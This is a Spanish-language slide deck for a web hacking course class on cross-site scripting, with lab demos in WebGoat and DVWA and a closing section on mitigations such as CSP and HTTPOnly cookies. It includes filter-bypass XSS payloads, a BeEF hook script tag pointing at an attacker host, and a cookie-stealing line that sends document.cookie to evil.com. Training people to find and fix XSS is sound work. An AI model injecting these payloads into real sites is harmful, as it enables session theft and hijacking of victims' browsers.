# Deck — Clase 3 · Módulo 2

> Curso de Web Hacking
> Duración: 2 horas
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 2 — Clase 3
### XSS Profundo, Bypass y BeEF

---

## Recap breve: Clase 2

- Burp Suite: interceptar, modificar y repetir requests
- SQL Injection: datos mezclados con consultas
- UNION SELECT para extraer datos de otras tablas
- Blind SQLi: boolean-based y time-based
- Automatización con Intruder
- La idea clave: **entender el contexto donde se interpreta el dato**

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | XSS: contextos de ejecución y tipos | ~30 min |
| 🧪 | Demo 1: Reflected XSS en WebGoat | ~20 min |
| **2** | DOM XSS, bypass de filtros y payloads | ~30 min |
| 🧪 | Demo 2: DOM XSS en WebGoat | ~20 min |
| **3** | BeEF: control del navegador post-XSS | ~20 min |
| 🧪 | Demo 3: BeEF hook en XSS | ~15 min |
| 🏁 | Impacto real y mitigaciones | ~10 min |

---

## XSS: ¿Qué es Cross-Site Scripting?

XSS es un fallo de **separación de contextos**.

El navegador no distingue entre:

1. **Datos legítimos**
2. **Código ejecutable**

Cuando esa distinción falla, el navegador ejecuta instrucciones que nunca debieron estar ahí.

---

## ¿Por qué XSS sigue en el OWASP Top 10?

- Afecta al **lado cliente** — muchos devs solo protegen el servidor
- Los frameworks modernos mitigan *algunos* casos, pero no todos
- DOM XSS no pasa por el backend → escapa a validaciones server-side
- El impacto real va mucho más allá de un `alert()`

---

## Contextos de ejecución

No todo payload funciona en todos los lugares. El navegador interpreta distinto según dónde caiga el input:

| Contexto | Ejemplo vulnerable | Payload |
|---|---|---|
| **HTML** | `<p>Hola INPUT</p>` | `<script>alert(1)</script>` |
| **Atributo** | `<img src="INPUT">` | `" onerror="alert(1)` |
| **JavaScript** | `var x = 'INPUT';` | `';alert(1);//` |
| **URL/href** | `<a href="INPUT">` | `javascript:alert(1)` |

La regla: **identificar el contexto antes de armar el payload**.

---

## Cómo detectar XSS: metodología

1. Encontrar puntos de entrada (parámetros GET, POST, headers, fragmentos)
2. Inyectar un string único de prueba (canary): `xss123test`
3. Buscar dónde se refleja en la respuesta
4. Determinar el contexto (HTML, atributo, JS, DOM)
5. Armar el payload acorde al contexto
6. Confirmar ejecución

Con curl para detectar reflexión:

```bash
# Inyectar canary y buscar en la respuesta
curl -s "http://target/search?q=xss123test" | grep "xss123test"

# Ver en qué contexto cae
curl -s "http://target/search?q=xss123test" | grep -B2 -A2 "xss123test"
```

---

## XSS Reflejado (Reflected XSS)

El payload:
1. Sale del navegador (en la URL o body)
2. Llega al servidor
3. Vuelve inmediatamente en la respuesta sin sanitizar

Típico en:
- Buscadores internos
- Mensajes de error
- Parámetros GET/POST reflejados
- Páginas de resultados

Ejemplo:

```
https://sitio.com/buscar?q=<script>alert('XSS')</script>
```

---

## XSS Persistente (Stored XSS)

El payload se **almacena** en el servidor (DB, archivo, log) y se ejecuta cada vez que alguien accede al contenido.

Aparece en:
- Comentarios y foros
- Perfiles de usuario
- Mensajes privados
- Paneles de administración (logs)
- Campos que se renderizan en otros contextos

Impacto: afecta a **múltiples víctimas** sin que el atacante intervenga de nuevo.

---

## XSS basado en DOM (DOM XSS)

La vulnerabilidad está en el JavaScript del **cliente**. El servidor puede comportarse correctamente.

El modelo mental:

```
SOURCE (de dónde viene el dato) → SINK (dónde se ejecuta)
```

Sources comunes:
- `location.hash`, `location.search`
- `document.URL`, `document.referrer`
- `window.name`, `postMessage`

Sinks peligrosos:
- `innerHTML`, `outerHTML`
- `document.write()`
- `eval()`, `setTimeout(string)`, `Function()`
- `element.src`, `element.href`

---

## DOM XSS: ejemplo concreto

Código vulnerable:

```javascript
// Source: location.hash (fragmento de URL después del #)
var input = document.location.hash.substring(1);
// Sink: innerHTML (inserción directa en el DOM)
document.getElementById('output').innerHTML = input;
```

Explotación:

```
http://target/page#<img src=x onerror=alert(document.cookie)>
```

El servidor nunca ve el payload (está después del `#`). Solo el navegador lo procesa.

---

## Comparativa de tipos

| Pregunta | Reflected | Stored | DOM |
|---|---|---|---|
| ¿Pasa por servidor? | Sí | Sí (se guarda) | No necesariamente |
| ¿Dónde está la falla? | Renderizado server-side | Almacenamiento + renderizado | JavaScript del cliente |
| ¿Cómo lo investigás? | Request/response | Buscar dónde se almacena | DevTools + sources + DOM |
| ¿Persistente? | No | Sí | Depende del source |
| ¿Víctimas? | 1 por click | Todas las que accedan | 1 por click (generalmente) |

---

## 🧪 Demo guiada 1 — Reflected XSS en WebGoat

**Target:** `Cross Site Scripting → Try It! Reflected XSS`

Pasos:
1. Abrir WebGoat → módulo Cross Site Scripting → pantalla 7
2. Probar valores normales en los campos del formulario
3. Inyectar el canary `test123` y ver dónde se refleja
4. Probar payload según contexto:

```html
"><script>alert('XSS')</script>
```

5. Identificar el campo vulnerable
6. Explicar por qué ese campo y no el otro

---

## Bypass de filtros

Muchos filtros fallan porque hacen blacklist de patrones obvios:
- Bloquean `<script>` → pero no `<img onerror=...>`
- Bloquean `alert` → pero no `confirm`, `prompt`, `fetch`
- Bloquean comillas → pero no backticks en template literals

Payloads de bypass comunes:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## Payloads alternativos

Sin `<script>` hay muchas opciones:

```html
<!-- Evento con <img> -->
<img src=x onerror=alert(1)>

<!-- SVG inline -->
<svg onload=alert(1)>

<!-- Event handlers en HTML5 -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- Sin paréntesis (bypass WAF) -->
<img src=x onerror=alert`1`>

<!-- Sin comillas ni espacios -->
<svg/onload=alert(1)>
```

La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código.

---

## Bypass: encoding y ofuscación

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Sin paréntesis (bypass WAF) -->
<img src=x onerror=alert`1`>

<!-- Sin comillas ni espacios -->
<svg/onload=alert(1)>

<!-- Evento con tab/newline -->
<img src=x	onerror
=alert(1)>
```

---

## 🧪 Demo guiada 2 — DOM XSS en WebGoat

**Target:** `Cross Site Scripting → Identify potential for DOM-Based XSS` (pantalla 10-11)

Pasos:
1. Abrir DevTools → Sources
2. Revisar el JavaScript que procesa la URL
3. Identificar el **source** (¿qué parte de la URL se lee?)
4. Identificar el **sink** (¿dónde se inserta?)
5. Modificar la URL con un texto de prueba
6. Construir payload DOM XSS:

```
http://target/WebGoat/start.mvc#test/<script>alert('DOM-XSS')</script>
```

---

## Después de la demo: diferencias clave

| Aspecto | Reflected XSS | DOM XSS |
|---|---|---|
| Herramienta principal | Burp / curl | DevTools |
| Evidencia | Response del servidor contiene el payload | El DOM contiene el payload |
| Detección automatizada | Fácil (scanners) | Difícil (requiere análisis de JS) |
| Fix | Escape server-side | Sanitizar en el JS del cliente |

---

## Herramientas para encontrar XSS

| Herramienta | Uso |
|---|---|
| **Burp Suite Repeater** | Manipular parámetros y ver reflexión en respuesta |
| **DevTools → Elements** | Ver dónde se inserta el input en el DOM |
| **DevTools → Sources** | Leer el JavaScript que maneja el input |
| **DevTools → Console** | Probar payloads directo |
| `curl + grep` | Detectar reflexión automatizada |
| **dalfox** | Scanner de XSS automatizado |

```bash
# dalfox básico
dalfox url "http://target/search?q=test" --blind your.xss.ht

# Con pipe desde parámetros descubiertos
echo "http://target/page?name=test" | dalfox pipe
```

---

## BeEF Framework: control del navegador

Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **plataforma de control remoto**.

**BeEF (Browser Exploitation Framework)** demuestra post-explotación tras XSS exitoso:
- Interacción con el DOM de la víctima
- Captura de credenciales ingresadas
- Reconocimiento de red interna (desde el navegador)
- Ingeniería social (alertas falsas, pop-ups de phishing)
- Detección de plugins y versión del navegador
- Pivoteo hacia otras máquinas accesibles desde el navegador de la víctima

---

## BeEF: cómo funciona

1. El atacante inyecta un **hook** (script JS que conecta al panel BeEF):

```html
<script src="http://attacker:3000/hook.js"></script>
```

2. La víctima ejecuta el hook (via XSS)
3. El navegador de la víctima se conecta al panel de BeEF
4. El atacante ejecuta módulos desde el panel:
   - Obtener cookies
   - Detectar software instalado
   - Capturar formularios
   - Escanear red interna
   - Social engineering (fake login, fake update)

---

## 🧪 Demo guiada 3 — BeEF hook en XSS

**Setup:**
1. Levantar BeEF en Kali/laboratorio
2. Copiar la URL del hook: `http://[IP]:3000/hook.js`

**Target:** sitio vulnerable a XSS (WebGoat o DVWA)

**Pasos:**
1. Inyectar payload con hook de BeEF:

```html
<script src="http://[IP]:3000/hook.js"></script>
```

2. Ver cómo el navegador se conecta al panel BeEF
3. Ejecutar módulos: obtener cookies, alert falso, redirect
4. Mostrar el impacto más allá del `alert(1)`

---

## Qué demuestra BeEF en clase

BeEF rompe dos ideas ingenuas sobre XSS:

1. *"Fue solo un alert, no pasa nada"* → Se puede escalar a robo de sesión completo
2. *"Si no toqué el servidor, el impacto es bajo"* → El navegador es un entorno de ejecución con capacidades poderosas

Un XSS puede ser el punto de entrada para:
- Secuestro de sesión activa
- Pivoteo dentro de la red (el navegador de la víctima como proxy)
- Abuso de confianza del usuario (acciones en su nombre)
- Encadenamiento con CSRF u otras vulnerabilidades

---

## Impacto real de XSS

Con XSS no solo mostrás un `alert(1)`. Es **prueba de ejecución**, no el objetivo final.

Un atacante puede:
- **Robar cookies/tokens:** `new Image().src='http://evil.com/?c='+document.cookie`
- **Capturar credenciales:** Inyectar formulario falso de login
- **Keylogger:** Registrar todo lo que escribe la víctima en tiempo real
- **Redirigir:** `location='http://phishing.com'`
- **Ejecutar acciones como la víctima:** Requests AJAX autenticados con su sesión
- **Escalar mediante hooking:** Mantener control persistente del navegador

El verdadero impacto depende de la imaginación del atacante y los privilegios de la víctima.

---

## Mitigaciones contra XSS

| Capa | Técnica |
|---|---|
| **Output encoding** | Escapar según contexto: HTML entities, JS escape, URL encode |
| **Input validation** | Allowlists cuando el formato es predecible |
| **CSP** | `Content-Security-Policy: default-src 'self'` bloquea inline scripts |
| **HTTPOnly cookies** | Previene robo de sesión vía `document.cookie` |
| **Framework auto-escape** | React, Angular, Vue escapan por defecto (excepto `dangerouslySetInnerHTML`) |
| **DOM sanitization** | DOMPurify para contenido dinámico en el cliente |

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

## Entregables del lab

Lo que deberían documentar:
- Captura del `alert('XSS')` ejecutándose (Reflected y DOM)
- Nombre del campo/parámetro vulnerable
- Explicación del source y sink (en DOM XSS)
- Payload usado y por qué funciona en ese contexto
- Captura de navegador hooked en BeEF
- Recomendación breve de mitigación

Mitigaciones esperadas:
- Escape/encoding según contexto
- No insertar input crudo en HTML
- CSP como defensa en profundidad
- Frameworks con auto-escape por defecto

---

## Resumen de lo aprendido

- XSS aparece cuando el navegador no puede distinguir datos de código
- Hay tres tipos: Reflected, Stored y DOM-based
- El **contexto** determina el payload: HTML, atributo, JS, URL
- Los filtros blacklist son fáciles de evadir con payloads alternativos
- BeEF demuestra que XSS no es "solo un alert" → control total del navegador
- CSP, HTTPOnly cookies y auto-escape son capas defensivas clave

---

## Próxima clase

**Módulo 2 - Clase 4:**
- **CSRF y SSRF:** Ataques que abusan de la confianza
- **Deserialization attacks:** Cuando los objetos ejecutan código
- **XXE:** Inyección en parsers XML
- **File Upload vulnerabilities:** Cómo un avatar se convierte en shell
- **Proyecto integrador del Módulo 2**

---

## Gracias

**Preguntas, consultas y dudas:**
Durante la clase o por el canal del curso.

**Para el próximo encuentro:**
Practicar los labs de XSS en WebGoat y preparar dudas sobre CSRF/SSRF.
